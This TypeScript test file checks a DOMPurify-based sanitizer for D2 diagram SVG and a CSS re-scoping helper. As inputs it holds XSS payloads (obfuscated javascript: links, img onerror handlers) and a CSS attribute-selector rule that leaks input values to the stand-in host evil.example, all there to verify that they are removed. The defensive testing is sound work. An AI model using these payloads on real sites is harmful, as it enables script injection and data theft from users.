// D2 SVG goes into innerHTML sinks (Markdown, D2Canvas, FileViewer,
// DiagramPreview, CanvasPanel), so `renderD2` purifies it centrally. node:test
// has no DOM, so this drives the sanitizer's own policy — the attribute hook
// DOMPurify calls for every attribute, and the fail-closed path — with the
// payloads that matter: a `javascript:` link and an `<img onerror>` label.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import {
  D2_PURIFY_CONFIG,
  d2AttributeHook,
  sanitizeD2Svg,
  scopeD2Css,
  scopeD2Styles,
  svgUrlAllowed,
} from '../src/modules/canvas/svgSanitize.ts';

function attr(attrName: string, attrValue: string) {
  const ev = { attrName, attrValue, keepAttr: true, allowedAttributes: {}, forceKeepAttr: undefined };
  d2AttributeHook({} as Element, ev);
  return ev.keepAttr;
}

test('javascript: links are dropped (href and xlink:href, obfuscated too)', () => {
  assert.equal(attr('href', 'javascript:alert(1)'), false);
  assert.equal(attr('xlink:href', 'JavaScript:alert(1)'), false);
  assert.equal(attr('href', 'java\tscript:alert(1)'), false);
  assert.equal(attr('href', ' \u0001javascript:alert(1)'), false);
  assert.equal(attr('href', 'data:text/html,<script>alert(1)</script>'), false);
  assert.equal(attr('href', 'vbscript:x'), false);
});

test('http(s) links and in-document fragments survive', () => {
  assert.equal(attr('href', 'https://example.com/x'), true);
  assert.equal(attr('xlink:href', 'http://example.com'), true);
  assert.equal(attr('href', '#marker-arrow'), true);
  assert.equal(svgUrlAllowed('mailto:a@b.c'), false);
});

test('event handlers are dropped regardless of element (img onerror payload)', () => {
  assert.equal(attr('onerror', 'alert(1)'), false);
  assert.equal(attr('ONLOAD', 'alert(1)'), false);
  assert.equal(attr('onclick', ''), false);
  // Ordinary presentation attributes are untouched.
  assert.equal(attr('fill', '#fff'), true);
  assert.equal(attr('class', 'shape'), true);
});

test('config keeps foreignObject labels but forbids active content', () => {
  assert.ok((D2_PURIFY_CONFIG.ADD_TAGS as string[]).includes('foreignObject'));
  for (const t of ['script', 'iframe', 'object', 'embed']) {
    assert.ok((D2_PURIFY_CONFIG.FORBID_TAGS as string[]).includes(t), t);
  }
});

test('fails closed when the purifier cannot run (no DOM)', () => {
  const payload =
    '<svg><a href="javascript:alert(1)"><text>x</text></a>' +
    '<foreignObject><img src="x" onerror="alert(1)"></foreignObject></svg>';
  const unsupported = {
    isSupported: false,
    addHook() { throw new Error('must not be reached'); },
    removeHook() {},
    sanitize() { throw new Error('must not be reached'); },
  };
  assert.equal(sanitizeD2Svg(payload, unsupported as never), null);
});

test('hook is installed only for the duration of one sanitize call', () => {
  const calls: string[] = [];
  const fake = {
    isSupported: true,
    addHook(name: string) { calls.push(`add:${name}`); },
    removeHook(name: string) { calls.push(`remove:${name}`); },
    sanitize(s: string) { calls.push('sanitize'); return s.replace(/ onerror="[^"]*"/, ''); },
  };
  const out = sanitizeD2Svg('<svg><img onerror="alert(1)"></svg>', fake as never);
  assert.equal(out, '<svg><img></svg>');
  assert.deepEqual(calls, ['add:uponSanitizeAttribute', 'sanitize', 'remove:uponSanitizeAttribute']);
  // Nothing SVG survived → caller gets an error, never raw markup.
  const empty = { ...fake, sanitize: () => '' };
  assert.equal(sanitizeD2Svg('<svg onload="x"></svg>', empty as never), null);
});

// S11-12: `<style>` survives purification, so its rules are re-scoped to the
// diagram's own `d2-<id>` class — a rule can no longer restyle the app.

test('D2 style rules are scoped to the diagram', () => {
  const css =
    '/* c */ @import url(https://evil.example/x.css); .d2-42 .fill-N1{fill:#000} ' +
    'body, input[value^="a"]{background:url(https://evil.example/?a)} ' +
    '@font-face{font-family:d2-42-font;src:url(data:font/woff;base64,AA)} ' +
    '@keyframes dash{from{x:0}to{x:1}} @media (min-width:1px){a{color:red}} @supports (x:y){b{c:d}}';
  const out = scopeD2Css(css, 'd2-42');
  assert.ok(!out.includes('@import'), out);
  assert.ok(!out.includes('@supports'), out);
  assert.ok(out.includes('.d2-42 .fill-N1{fill:#000}'), out);
  assert.ok(out.includes('.d2-42 body,.d2-42 input[value^="a"]{'), out);
  assert.ok(out.includes('@font-face{'), out);
  assert.ok(out.includes('@keyframes dash{'), out);
  assert.ok(out.includes('@media (min-width:1px){.d2-42 a{color:red}}'), out);
});

test('styles without a diagram scope class are dropped', () => {
  const svg = '<svg><style>body{display:none}</style><g/></svg>';
  assert.equal(scopeD2Styles(svg), '<svg><style></style><g/></svg>');
  const scoped = scopeD2Styles('<svg class="d2-7 d2-svg"><style>.x{a:b}</style></svg>');
  assert.equal(scoped, '<svg class="d2-7 d2-svg"><style>.d2-7 .x{a:b}</style></svg>');
});
